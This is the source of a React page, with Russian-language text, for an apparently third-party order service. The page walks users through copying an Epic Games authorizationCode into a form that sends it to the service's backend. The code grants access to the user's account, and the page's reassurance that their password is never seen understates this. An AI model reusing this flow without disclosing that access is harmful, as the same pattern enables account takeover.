'use client';

import { useEffect, useState } from 'react';
import { Logo } from '@/components/ui/Logo';
import { authApi } from '@/lib/api';

interface AuthPageProps {
  params: {
    orderId: string;
  };
}

export default function AuthPage({ params }: AuthPageProps) {
  const { orderId } = params;
  const [loginUrl, setLoginUrl] = useState<string>('');
  const [code, setCode] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [success, setSuccess] = useState<{ displayName: string } | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    authApi.getLoginUrl().then((res) => {
      if (res?.success) setLoginUrl(res.data.loginUrl);
    }).catch((e) => {
      console.error(e);
      setError('Не удалось загрузить данные авторизации');
    });
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!code.trim()) return;
    setSubmitting(true);
    setError(null);

    try {
      const res = await authApi.submitCode(orderId, code.trim());
      if (res?.success) {
        setSuccess({ displayName: res.data.displayName });
        setTimeout(() => {
          window.location.href = `/order/${orderId}/timeline`;
        }, 2000);
      }
    } catch (err: any) {
      const msg = err?.response?.data?.message || 'Код недействителен. Получите новый.';
      setError(msg);
    } finally {
      setSubmitting(false);
    }
  };

  const handleCopyUrl = () => {
    navigator.clipboard.writeText(loginUrl);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-6">
      <div
        className="rounded-[24px] p-8 md:p-10 text-center max-w-[560px] w-full relative overflow-hidden"
        style={{
          background: 'rgba(255, 255, 255, 0.02)',
          backdropFilter: 'blur(40px)',
          WebkitBackdropFilter: 'blur(40px)',
          border: '1px solid rgba(255, 255, 255, 0.06)',
        }}
      >
        <div className="flex justify-center mb-4">
          <Logo size={48} />
        </div>

        <div className="text-xs uppercase tracking-[4px] mb-6" style={{ color: '#71717a' }}>
          Авторизация Epic Games
        </div>

        {success ? (
          <div className="py-8">
            <div
              className="w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-5"
              style={{
                background: 'linear-gradient(135deg, #22c55e 0%, #16a34a 100%)',
                boxShadow: '0 8px 40px rgba(34, 197, 94, 0.5)',
              }}
            >
              <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" strokeWidth={3} viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h2 className="text-xl font-bold mb-2" style={{ color: '#22c55e' }}>
              Успешно авторизованы
            </h2>
            <p className="text-sm" style={{ color: '#a1a1aa' }}>
              Вход выполнен как <b style={{ color: '#f4f4f5' }}>{success.displayName}</b>
            </p>
            <p className="text-sm mt-4" style={{ color: '#71717a' }}>
              Переходим к обработке заказа...
            </p>
          </div>
        ) : (
          <>
            <div className="text-left space-y-5">
              {/* Step 1 */}
              <div
                className="rounded-2xl p-5"
                style={{
                  background: 'rgba(139, 92, 246, 0.06)',
                  border: '1px solid rgba(139, 92, 246, 0.2)',
                }}
              >
                <div className="flex items-start gap-3 mb-3">
                  <div
                    className="flex-shrink-0 w-7 h-7 rounded-full flex items-center justify-center text-sm font-bold"
                    style={{ background: 'rgba(139, 92, 246, 0.3)', color: '#a78bfa' }}
                  >
                    1
                  </div>
                  <div>
                    <h3 className="font-semibold text-[15px]" style={{ color: '#f4f4f5' }}>
                      Войдите в Epic Games
                    </h3>
                    <p className="text-xs mt-1" style={{ color: '#a1a1aa' }}>
                      Откройте официальную страницу Epic Games в новой вкладке
                    </p>
                  </div>
                </div>
                <a
                  href={loginUrl}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="block w-full text-center py-3 rounded-xl font-semibold text-sm transition-all hover:-translate-y-0.5"
                  style={{
                    background: 'linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%)',
                    color: 'white',
                    boxShadow: '0 4px 20px rgba(139, 92, 246, 0.4)',
                  }}
                >
                  Открыть Epic Games →
                </a>
              </div>

              {/* Step 2 */}
              <div
                className="rounded-2xl p-5"
                style={{
                  background: 'rgba(255, 255, 255, 0.02)',
                  border: '1px solid rgba(255, 255, 255, 0.06)',
                }}
              >
                <div className="flex items-start gap-3 mb-3">
                  <div
                    className="flex-shrink-0 w-7 h-7 rounded-full flex items-center justify-center text-sm font-bold"
                    style={{ background: 'rgba(255, 255, 255, 0.1)', color: '#a1a1aa' }}
                  >
                    2
                  </div>
                  <div>
                    <h3 className="font-semibold text-[15px]" style={{ color: '#f4f4f5' }}>
                      Скопируйте код
                    </h3>
                    <p className="text-xs mt-1" style={{ color: '#a1a1aa' }}>
                      После входа Epic покажет JSON — скопируйте значение поля <b>authorizationCode</b>
                    </p>
                  </div>
                </div>
                <div
                  className="text-xs font-mono p-3 rounded-lg"
                  style={{
                    background: 'rgba(0, 0, 0, 0.3)',
                    color: '#71717a',
                    lineHeight: 1.6,
                  }}
                >
                  {`{`}
                  <br />
                  &nbsp;&nbsp;<span style={{ color: '#8b5cf6' }}>"redirectUrl"</span>: <span style={{ color: '#22c55e' }}>"..."</span>,
                  <br />
                  &nbsp;&nbsp;<span style={{ color: '#8b5cf6' }}>"authorizationCode"</span>: <span style={{ color: '#eab308' }}>"a1b2c3..."</span> ← это
                  <br />
                  {`}`}
                </div>
              </div>

              {/* Step 3 — form */}
              <form onSubmit={handleSubmit} className="rounded-2xl p-5" style={{
                background: 'rgba(255, 255, 255, 0.02)',
                border: '1px solid rgba(255, 255, 255, 0.06)',
              }}>
                <div className="flex items-start gap-3 mb-4">
                  <div
                    className="flex-shrink-0 w-7 h-7 rounded-full flex items-center justify-center text-sm font-bold"
                    style={{ background: 'rgba(255, 255, 255, 0.1)', color: '#a1a1aa' }}
                  >
                    3
                  </div>
                  <div>
                    <h3 className="font-semibold text-[15px]" style={{ color: '#f4f4f5' }}>
                      Вставьте код сюда
                    </h3>
                    <p className="text-xs mt-1" style={{ color: '#a1a1aa' }}>
                      Код действует 5 минут
                    </p>
                  </div>
                </div>

                <input
                  type="text"
                  value={code}
                  onChange={(e) => setCode(e.target.value.replace(/["\s]/g, ''))}
                  placeholder="Вставьте authorizationCode"
                  className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-3 text-sm font-mono focus:outline-none focus:border-purple-500"
                  autoComplete="off"
                />

                {error && (
                  <div
                    className="mt-3 p-3 rounded-lg text-xs"
                    style={{
                      background: 'rgba(239, 68, 68, 0.1)',
                      border: '1px solid rgba(239, 68, 68, 0.3)',
                      color: '#ef4444',
                    }}
                  >
                    {error}
                  </div>
                )}

                <button
                  type="submit"
                  disabled={submitting || !code.trim()}
                  className="w-full mt-4 py-3 rounded-xl font-semibold text-sm transition-all disabled:opacity-50 disabled:cursor-not-allowed hover:-translate-y-0.5"
                  style={{
                    background: 'linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%)',
                    color: 'white',
                  }}
                >
                  {submitting ? 'Проверяем код...' : 'Подтвердить'}
                </button>
              </form>
            </div>

            <p className="text-xs mt-6" style={{ color: '#71717a' }}>
              🔒 Мы никогда не увидим ваш пароль — вход выполняется только на epicgames.com
            </p>
          </>
        )}
      </div>
    </div>
  );
}
